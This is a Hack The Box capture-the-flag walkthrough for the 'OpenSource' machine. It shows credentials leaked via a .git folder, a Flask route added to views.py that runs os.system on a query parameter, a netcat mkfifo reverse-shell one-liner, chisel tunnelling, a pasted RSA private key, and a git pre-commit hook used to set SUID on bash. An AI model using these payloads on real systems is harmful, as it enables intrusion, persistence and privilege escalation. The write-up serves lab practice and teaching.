---
title: "Hack The Box - OpenSource"
tags: [linux,easy,git,pre-commit,python-exploit,PortForward,chisel]
categories: HackTheBox-Linux
---
![image](https://user-images.githubusercontent.com/66876484/193425998-accb083e-034b-4d55-92ab-856ddf9c7de2.png)


## *NMAP*
![image](https://user-images.githubusercontent.com/66876484/193426181-41176e42-5026-47fe-81e6-e7ea7bed9b07.png)
![image](https://user-images.githubusercontent.com/66876484/193426207-92de2298-8b27-41a9-abb4-083739dd5485.png)


As i have did full port scan 
there are 2 ports open 
1. 22/ssh
2. 80/http

## *Enumerating [ 80/http ]*

-> we can look down there we have something to download 

![image](https://user-images.githubusercontent.com/66876484/193426210-98642a74-4e99-4c4a-96b7-306e4717f9ed.png)


we have got something zip file **`source.zip`** lets download and unzip 

## *Enumerating [ Source.zip]*

![image](https://user-images.githubusercontent.com/66876484/193426213-323bd256-48bb-4fda-b913-f126706a9319.png)


![image](https://user-images.githubusercontent.com/66876484/193426218-24374240-47f7-4c83-812f-9577e067ed98.png)


.git looks intresting 

![image](https://user-images.githubusercontent.com/66876484/193426249-503f56ef-3550-4266-98e8-4a4cc585deea.png)



we foudn some credential  dev01:Soulless_Developer#2022   lets save it our note and  we can see that it pointing out to something 
**`/app/app/views.py`**

![image](https://user-images.githubusercontent.com/66876484/193426255-fdf33487-3dbe-4fd0-a2fa-3a9c10694994.png)


 -->  Got to  /app/app  we can see views.py
 
```python
import os

from app.utils import get_file_name
from flask import render_template, request, send_file

from app import app


@app.route('/', methods=['GET', 'POST'])
def upload_file():
    if request.method == 'POST':
        f = request.files['file']
        file_name = get_file_name(f.filename)
        file_path = os.path.join(os.getcwd(), "public", "uploads", file_name)
        f.save(file_path)
        return render_template('success.html', file_url=request.host_url + "uploads/" + file_name)
    return render_template('upload.html')


@app.route('/uploads/<path:path>')
def send_report(path):
    path = get_file_name(path)
    return send_file(os.path.join(os.getcwd(), "public", "uploads", path))
    
``` 
-->  as you can see there is an func app route so we can create our own func to get our revers shell

```python
@app.route('/shell')
def cmd():
    return os.system(request.args.get('cmd'))
```

--> So our New Views.py will Look like this 

```python
import os

from app.utils import get_file_name
from flask import render_template, request, send_file

from app import app


@app.route('/', methods=['GET', 'POST'])
def upload_file():
    if request.method == 'POST':
        f = request.files['file']
        file_name = get_file_name(f.filename)
        file_path = os.path.join(os.getcwd(), "public", "uploads", file_name)
        f.save(file_path)
        return render_template('success.html', file_url=request.host_url + "uploads/" + file_name)
    return render_template('upload.html')


@app.route('/uploads/<path:path>')
def send_report(path):
    path = get_file_name(path)
    return send_file(os.path.join(os.getcwd(), "public", "uploads", path))

@app.route('/shell')
def cmd():
    return os.system(request.args.get('cmd'))
    
    
``` 


```bash
So basically what we are doing is we have found views.py in which we have created our own payload from the pre defined function called @app.route  which will help us execute our command to get our reverse shell 

we need to upload our new view.py in the same dir /app/app/views.py using burpsuite  on the victim system to get our payload run  ( means we are overwritting the views.py with our malicious code )

```

--> change the file location and put it **`/app/app/views.py`**

![image](https://user-images.githubusercontent.com/66876484/193426265-04a40212-16c9-4816-b88a-89587d1fe863.png)


--> then use this one liner reverse shell code with encoded 

```
❯ curl 'http://10.10.11.164/shell?cmd=rm%20/tmp/f;mkfifo%20/tmp/f;cat%20/tmp/f|/bin/sh%20-i%202>%261|nc%2010.10.14.10%20443%20>/tmp/f'
```


### *Privilege Escalation [ container  to dev01 ]*

--> we got our reverse shell back
as we can see we got the root inside in a container 

![image](https://user-images.githubusercontent.com/66876484/193426275-cff57ad2-0f24-46df-92f2-8694459ddea7.png)


--> local  portforward it
so we will upload chisel and send the port to our local computer


![image](https://user-images.githubusercontent.com/66876484/193426278-9e43ceeb-1b73-4ef2-8b15-c721d9922232.png)


```
❯ chisel server --reverse --port 5678
2022/06/09 14:33:07 server: Reverse tunnelling enabled
2022/06/09 14:33:07 server: Listening on http://0.0.0.0:5678
2022/06/09 14:37:20 server: session#1: tun: proxy#R:2000=>172.17.0.1:2000:Listening
```

```
/app # ./chisel client 10.10.16.21:5678 R:2000:172.17.0.1:2000
2022/06/09 19:37:20 client: Connecting to ws://10.10.16.21:5678
2022/06/09 19:37:21 client: Connected
```
--> If we open in the browser the localhost on port 2000 we see a login  panel we can use the 
      credentials that we found at the beginning ofv01:Soulless_Developer#2022


![image](https://user-images.githubusercontent.com/66876484/193426295-43f8a7d1-3e91-4ee8-b456-f2be1a2ccb78.png)

  --> we have  as dev01 we can see a "home-backup" repository that has ssh key that we can test to check if its connect or not 
```
-----BEGIN RSA PRIVATE KEY-----
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
-----END RSA PRIVATE KEY-----
```
![image](https://user-images.githubusercontent.com/66876484/193426336-4ca285ab-2b8c-45f2-8c51-4d79fd472522.png)


### *Privilege Escalation [ dev01 to root]*

```
❯ ssh dev01@10.10.11.164 -i id_rsa

❯ dev01@opensource:~$ ls
user.txt
❯ dev01@opensource:~$ cat user.txt

```


![image](https://user-images.githubusercontent.com/66876484/193426342-c6b4b326-5ae1-4774-b902-59dea54b8bba.png)


--> Run linpeas or pspy we can see  that root executes tasks with git every minute


```
CMD: UID=0    PID=20396  | git add .
CMD: UID=0    PID=20397  | git commit -m Backup for 2022-06-09
CMD: UID=0    PID=20398  | /usr/lib/git-core/git gc --auto
CMD: UID=0    PID=20400  | /usr/lib/git-core/git-remote-http origin http://opensource.htb:3000/dev01/home-backup.git
CMD: UID=0    PID=20399  | git push origin main
```

In [gtfobins](https://gtfobins.github.io/gtfobins/git/) we see an example abusing the pre-commit, we can try it and wait for  a minute we become root


```bash
dev01@opensource:~$ echo "chmod u+s /bin/bash" >> ~/.git/hooks/pre-commit
dev01@opensource:~$ chmod +x !$
chmod +x ~/.git/hooks/pre-commit
dev01@opensource:~$ ls -l /bin/bash
-rwxr-xr-x 1 root root 1113504 Apr 18 15:08 /bin/bash

```
![image](https://user-images.githubusercontent.com/66876484/193426377-12b488ae-ccd4-47c1-aede-762bb6aa6746.png)


--> and after we minutes 

```bash
dev01@opensource:~$ bash -p 
bash-4.4# ls
user.txt
bash-4.4# cd /root
bash-4.4# ls
config  meta  root.txt  snap
bash-4.4# cat root.txt

```
![image](https://user-images.githubusercontent.com/66876484/193426379-e66a8606-4a48-45d1-a695-8bc1d09191bd.png)



